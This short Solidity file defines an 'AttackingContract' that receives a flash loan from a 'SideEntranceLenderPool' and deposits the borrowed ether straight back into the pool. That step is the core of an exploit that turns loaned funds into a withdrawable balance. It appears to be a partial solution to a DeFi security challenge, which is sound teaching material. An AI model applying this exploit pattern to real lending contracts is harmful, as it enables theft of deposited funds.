// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {IFlashLoanEtherReceiver, SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract AttackingContract is IFlashLoanEtherReceiver{

    SideEntranceLenderPool sideEntrancePool;

    constructor(address _pool) {
        sideEntrancePool = SideEntranceLenderPool(_pool);
    }

    function execute() external payable {
        sideEntrancePool.deposit{value: msg.value}();
    }

}